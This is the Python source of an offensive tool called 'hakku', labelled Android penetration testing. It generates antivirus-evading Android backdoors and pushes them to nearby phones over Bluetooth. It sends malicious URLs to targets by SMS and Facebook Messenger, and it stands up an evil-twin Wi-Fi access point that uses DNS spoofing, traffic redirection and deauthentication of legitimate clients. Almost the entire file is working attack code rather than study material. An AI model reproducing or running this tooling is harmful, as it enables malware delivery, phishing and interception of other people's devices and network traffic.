#!/usr/bin/python
# -*- coding: utf-8 -*-
########################
#
# CODENAME: hakku
# CODEBY: Th3-J0k3r
#
########################


import ConfigParser
import time
import socket
import os
import random
import sys
from ansi.colour import fg,bg 
from colorama import Fore,Back,Style


#
# Configuration file.
#
global config
config = ConfigParser.ConfigParser()
config.read("config.cfg")

btActive = config.get("BT", "ACTIVE")
smsActive = config.get("SMS", "ACTIVE")
fbActive  = config.get("FB", "ACTIVE")

if (btActive == 'TRUE' and smsActive == 'FALSE' and fbActive == 'FALSE'):
	from bluetooth import *
	from PyOBEX.client import *

if (btActive == 'FALSE' and smsActive == 'TRUE' and fbActive == 'FALSE'):
	from twilio.rest import *

if (btActive == 'FALSE' and smsActive == 'FALSE' and fbActive == 'TRUE'):
	from fbchat.models import *
	import fbchat
#
# DEBUG: Symbols
#
CORRECT = "[✔]"
ERROR   = "[✖]"
INFO    = "[?]"



#
# Print Method
#
def Print(symbol, text):


	# Correct
	if (symbol == CORRECT):	
		print(Style.BRIGHT)	
		print(Fore.GREEN + CORRECT + " " + Fore.WHITE + text)
		time.sleep(1)
		
	# Error
	if (symbol == ERROR):
		print(Style.BRIGHT)		
		print(Fore.RED + ERROR + " " + Fore.WHITE + text)
		time.sleep(1)
		
	# Info
	if (symbol == INFO):
		print(Style.BRIGHT)		
		print(Fore.BLUE + INFO + " " + Fore.WHITE + text)
		time.sleep(1)



#
# Check the internet connection
#
def CheckInternet ():
	Print(INFO, "Checking internet connection...")
	conn = os.system("ping www.google.com -c 1 >> logs/conn")
	if (conn == 0): 
		Print(CORRECT, "Internet Connection Successfull")
		return 0
	else:
		Print(ERROR, "Not Internet Connection")
		return 1


#
# Create Malware
#
def CreateBackdoor():
	name = config.get("BACKDOOR", "BACKDOOR_NAME")
	payl = config.get("BACKDOOR", "BACKDOOR_PAYLOAD")
	if (os.path.isdir("apkwash") == False):
		os.system("git clone https://github.com/jbreed/apkwash.git")
		Print(CORRECT, "APKWASH Installed successfully!")

		time.sleep(1)
		Print(INFO,"Creating malware to bypass Anti-Virus")
		os.system("terminator -e 'apkwash -p %s -o %s' &" % (payl, name))
	else:
		if (config.get("AP","ACTIVE")):
			Print(INFO,"Creating malware to bypass Anti-Virus")
			os.system("terminator -e 'apkwash -p %s -o %s' &" % (payl, name))
			time.sleep(20)
			# Copy the backdoor to /var/www/html
			os.system("cp %s /var/www/html" % (config.get("BACKDOOR", "BACKDOOR_NAME")))
		else:
			time.sleep(20)
			Print(INFO,"Creating malware to bypass Anti-Virus")
			os.system("terminator -e 'apkwash -p %s -o %s' &" % (payl, name))


#
# Get the URL
#
def GetURL():
	print(Style.BRIGHT)
	return raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Type in the URL to the malicious server \n" + Fore.BLUE + "[*] " + Fore.WHITE + "You can use SET for this\n URL: ")




#
# Send Message through messenger
#
def SendToMessenger():

	if (CheckInternet() == 0):

		# Get some config variablles
		email     = config.get("FB","EMAIL")
		password  = config.get("FB", "PASS")
		target_id = config.get("FB", "TARGET")

		if (email != "" and password != "" and target_id != ""):


			CreateMessage()
			
			message = ""
			with open('message.txt') as f:
				data=f.readlines()
				for line in data:
					message += line
			
			# Setup the message
			server  = GetURL()

			# Setup the client
			client = fbchat.Client(email,password)

			users = client.searchForUsers(target_id)
			user = users[0]
			if (len(user) > 0):

				Print(CORRECT, "Found USER %s - %s" % (format(user.name),format(user.uid)))
				client.send(Message(text=str(message) + "\n" + server),thread_id=user.uid,thread_type=ThreadType.USER)

				Print(CORRECT, "Malicious URL Sent!")
				client.logout()
		else:
			Print(ERROR, "Please configure the facebook deployment option")
			Menu()




#
# Send evil link through to messenger
#
def SendSMS():


	if (CheckInternet() == 0):

		# Get the malicious server
		server = GetURL()

		# Get some config variables
		account_sid  = config.get("SMS","SID")
		auth_token   = config.get("SMS","TOKEN")
		phone_number = config.get("SMS","TO")
		from_number  = config.get("SMS","From")	

		if (account_sid != "" and 
		     auth_token != "" and 
	           phone_number != "" and from_number != ""):



			CreateMessage()

			messagef  = config.get("SMS", "MESSAGE_FILE")

			if os.path.isfile(messagef):
			    with open(messagef) as f:
			    	message = f.read().splitlines()
			
			# Send the sms message
			Print(INFO, "Sending SMS to - %s" % phone_number)
			client = Client(account_sid, auth_token)
			client.messages.create(
				to=phone_number,
				from_=from_number,
				body=str(message)+server)

			Print(CORRECT, "SMS Sent")
			Menu()	
		else:
			Print(ERROR, "Please configure the SMS deployment option")
			Menu()

#
# Creates the message to be sent
#
def CreateMessage ():
	if (os.path.isfile('message.txt') == True):
	    os.system("rm message.txt")

	Print(INFO, "Please type your message")
	print("Type done when finished")
	fwrite = open('message.txt', 'w+')
	while True:
		message = raw_input("")

		if (message == "done"):
			fwrite.close()
			Print(CORRECT, "Message has been created")
			break
		else:
			fwrite.write(message)
				

#
# Scan for devices
#
def Scan():

	os.system("clear")
	Banner()

	global interface
	print(Style.BRIGHT)
	interface = raw_input(Fore.WHITE + "\nType your interface: (hci0) ")
	if (os.system("hciconfig %s reset" % (interface)) == 0):

		Print(CORRECT, "Interface is up ")


		try:
			# Discover Devices.
			Print(INFO, "Scanning...")
			devices = discover_devices(duration=int('10'), lookup_names=True)
						
				

			# Print the device info
			Print(INFO, "Found %s Devices" % len(devices))
			if (len(devices) == 0):
				SetupBluetooth()
			else:


				for addr, name in devices:	
					Print(INFO, " %s - %s\n" % (addr, name))
					
				global mac	
				mac = raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Select Bluetooth MAC: ")
				while len(mac) == 0:
					mac = raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Select Bluetooth MAC: ")
			SendFile(mac)
						

		except OSError as e:
			Print(ERROR, "%s " % e)	
				
	else:
		Print(ERROR, "Please plug in device.")
	

#
# Send file through bluetooth
#
def SendFile (mac):


	try:

		# Search for the OBEX service.
		Print(INFO, "Searching for OBEX Object Push Service...")
		service_matches = find_service(name='OBEX Object Push', address = mac )
		

		# Check to see if services have been found.
		if len(service_matches) == 0:
		   	Print(ERROR, "Couldn't find the service.")
		    	sys.exit(0)

		# Get the service information
		first_match = service_matches[0]
		port = first_match["port"]
		name = first_match["name"]
		host = first_match["host"]

		# Connect to the device.
		Print(INFO, "Connecting to \"%s\" on %s" % (name, host))
		client = Client(host, port)	
		client.connect()

		Print(INFO, "Waiting for backdoor creation")
		CreateBackdoor()

		# Read the file
		payload = config.get("BACKDOOR","BACKDOOR_NAME")
		if (os.path.isfile(payload) == True):
			fileR = open(payload, "r")
			lines = fileR.readlines()


			# Define the data.
			data = ""
			for l in lines:
				data += l

			# Spam the connection
			while True:
				time.sleep(1)
				response = client.put(payload, data)
				response = str(response)
				if ("UnknownResponse" in response):
					Print(INFO,"Trying to send file to %s" % host)
					client.disconnect()
					time.sleep(1)
					client = Client(host, port)	
					client.connect()
				else:
					Print(CORRECT, "File sent to %s" % name)
					Menu()
					break
		else:
			Print(ERROR, "Payload not found...")
			SetupBluetooth()
	except OSError as e:
		Print(ERROR,"%s" % e)
		SetupBluetooth()


#
# Evil Twin Setup
#
def EvilTwin ():

	if (CheckInternet() == 0):

		interface = raw_input("Please type in you interface: (wlan0) ")
		ip = socket.gethostbyname(socket.gethostname())
			
		print(Style.BRIGHT)
		if (os.path.isfile("./logs/interface.txt")):
			os.system("rm ./logs/interface.txt")
			
		# Check if our evil website is setup.
		website = config.get("AP","WEBSITE_DIR")
		if (os.path.isfile(website) == False):
			Print(ERROR,  "No Website setup try creating a evil html and put it in /var/www/html/ directory")
			sys.exit(1)

		# Start some services.
		Print(INFO, "Starting some services...")
		os.system("service apache2 start")


		# Running DNSSpoof Attack
		if (os.path.isfile('hosts')):
			os.system("rm hosts")

		hostfile = open('hosts', 'w')
		hostfile.write("""
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

""")		
		hostfile.close()


		# Show the interfaces
		Print(CORRECT, "Putting Device into Monitor Mode...")
		os.system("ifconfig %s down" % interface)
		os.system("iwconfig %s mode monitor" % interface)
		os.system("ifconfig %s up" % interface)		
		time.sleep(2)
	
				
		# Scanning for networks
		sig = os.system("airodump-ng %s" % interface)
		if (sig == 2):
			print(Style.BRIGHT)
			bssid = raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Type Target BSSID:   ")
			essid = raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Type Target ESSID:   ")
			chann = raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Type Target CHANNEL: ")

			print(Style.BRIGHT)
			Print(CORRECT, "Creating Rogue AP - %s" % essid)			
			os.system("terminator -e 'airbase-ng -e %s -c %s %s' &" % (essid, chann, interface))

			# Creating the DHCP Server
			print(Style.BRIGHT)
			Print(CORRECT, "Creating dnsmasq config file...")
			dhcpdConf = open("/etc/dnsmasq.conf", "w")
			dhcpdConf.write("""
interface=at0
dhcp-range = 10.0.0.10,10.0.0.250,12h
dhcp-option = 3,10.0.0.1
dhcp-option = 6,10.0.0.1
server = 8.8.8.8
log-queries
log-dhcp
		""")	
			dhcpdConf.close()
	
			os.system("""
		ifconfig at0 10.0.0.1 netmask 255.255.255.0;
		route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1;
		iptables --flush;
		iptables --table nat --flush;
		iptables --delete-chain;
		iptables --table nat --delete-chain;
		iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE;
		iptables --append FORWARD --in-interface at0 -j ACCEPT;
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:80;
		iptables -t nat -A POSTROUTING -j MASQUERADE;
		echo 1 > /proc/sys/net/ipv4/ip_forward;
		""" % (ip))
			os.system("terminator -e 'dnsmasq -C /etc/dnsmasq.conf -d' &")	
				
			os.system("echo %s\t'*' >> hosts" % ip)
			Print(INFO,  "Running DNS Spoof Attack")
			print(Style.BRIGHT)
			os.system("terminator -e 'dnsspoof -i at0' &")

			# DeAuthenticating Clients from network.
			Print(INFO, "Deauthenticating Clients from network...")
			print(Style.BRIGHT)
			os.system("echo %s > blacklist" % bssid)
			os.system("terminator -e 'mdk3 %s d -b blacklist -c %s' &" % (interface, chann))

			# Create the backdoor
			CreateBackdoor()
	
		
#
# Banner
#
def Banner():
	
	# Clear the console
	os.system("clear")	
	print(Style.BRIGHT)
	msg = """


██╗  ██╗ █████╗ ██╗  ██╗██╗  ██╗██╗   ██╗
██║  ██║██╔══██╗██║ ██╔╝██║ ██╔╝██║   ██║
███████║███████║█████╔╝ █████╔╝ ██║   ██║
██╔══██║██╔══██║██╔═██╗ ██╔═██╗ ██║   ██║
██║  ██║██║  ██║██║  ██╗██║  ██╗╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
                                         
"""
	print(Style.BRIGHT)
	print fg.red(msg)
	print(Style.BRIGHT)
	print(Fore.WHITE + "💀💀" + " ANDROID PENETRATION TESTING " + "💀💀")
	print(Style.BRIGHT)
	print(Fore.YELLOW + "\t By: " + Fore.YELLOW + "Krypt0Mux 👺\n\n")



#
# Main Menu
#
def Menu():

	Banner()
	
	btActive = config.get("BT", "ACTIVE")
	smsActive = config.get("SMS", "ACTIVE")
	fbActive  = config.get("FB", "ACTIVE")
	apActive  = config.get("AP", "ACTIVE")

	if (btActive == 'FALSE' and smsActive == 'FALSE' and fbActive == 'FALSE' and apActive == 'TRUE'):
		Print(CORRECT, "Evil Twin Deployment Options ACTIVE")
		EvilTwin()

	elif (btActive == 'TRUE' and smsActive == 'FALSE' and fbActive == 'FALSE' and apActive == 'FALSE'):
		Print(CORRECT, "Bluetooth Deployment Options ACTIVE")
		Scan()

	elif (btActive == 'FALSE' and smsActive == 'TRUE' and fbActive == 'FALSE' and apActive == 'FALSE'):
		Print(CORRECT, "SMS Deployment Options ACTIVE")
		SendSMS()

	elif (btActive == 'FALSE' and smsActive == 'FALSE' and fbActive == 'TRUE' and apActive == 'FALSE'):
		Print(CORRECT, "Facebook Deployment Options ACTIVE")		
		SendToMessenger()

	else:
		Print(ERROR, "No Deployment Options ACTIVE")
		return
Menu()	
